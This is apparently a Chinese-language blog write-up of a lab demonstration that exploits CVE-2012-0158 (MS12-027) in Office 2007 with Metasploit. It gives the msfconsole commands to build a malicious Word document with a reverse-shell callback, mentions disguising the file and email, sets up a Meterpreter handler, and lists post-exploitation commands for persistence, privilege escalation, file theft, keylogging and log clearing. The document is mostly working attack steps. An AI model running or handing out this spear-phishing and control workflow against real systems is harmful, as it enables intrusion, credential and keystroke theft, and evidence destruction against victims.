cve-2012-0158&&ms12_027

0x01 Background

为了给实验室做一个面向领导的攻击演示，也正好想顺便研究一下2012-0158这个office通用的漏洞，便选择了邮件携带word附件这种比较偏向实战的鱼叉攻击的方式。本来希望自己去复现一下这个漏洞，但是由于还有一个钓鱼wifi的演示加上时间有点紧张，没能完全搞清楚如何去利用这个漏洞，最后直接使用了MSF生成攻击样本。这个漏洞的具体成因以及如何触发我也会在后续的文章中进行探讨（先贴一个大神一步一步分析这个漏洞的

感兴趣的同学可以提前了解一下），本文先记录一下在使用msf生成攻击样本和后续持续控制中的一些要点。

0x02 MSF Commond

 刚刚接触的时候觉得msf是一个比较傻瓜化的工具，不过它的功能确实是很强大。这种低技术，低成本的攻击方式也使得安全的形势逐渐严峻，本文使用的方式也基本是一个稍微懂计算机技术的人都可以轻易复现。

系统环境：ubuntu14.04+windows7 SP1+office 2007

msfconsole



search office



use expliot/windows/fileformat/ms12_027_mscomctl_bof
show options



可以看到这个漏洞影响的版本是office 2007  windows SP1版本，接下来配置一下shell返回连接的参数。

set LHOST 192.168.216.128
set LPORT 8082
exploit

在系统中生成了msf.doc的文档，伪装一下文件名和邮件内容发送，遗憾的是，邮件的扫描形同虚设。

0x03 Meterpreter Command

Meterpreter是msf的一个附属工具，它的强大的控制指令使得在取得受害机shell之后更加方便的进行后续操作。

常见的反向shell：

use exploit/multi/handler
set LHOST 192.168.216.128
set LPORT 8082
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

Windows打开word即会触发漏洞，获取远程shell，为防止用户关闭word后失去控制，将shell迁移到一个持续的进程上。

migrate pid

屏幕截取：

screenshot

权限提升：

getsystem

文件上传下载：

upload
download

键盘记录：

keyscan_start
keyscan_dump
keyscan_stop

清除日志：

clearav

0x04 End

总的来说这个漏洞是一个通用性强的漏洞，在利用样本的生成和后续的控制上展示了MSF的强大功能。这篇文章没有太多的具体技术，但是确实让我对MSF这个框架更加的熟悉。
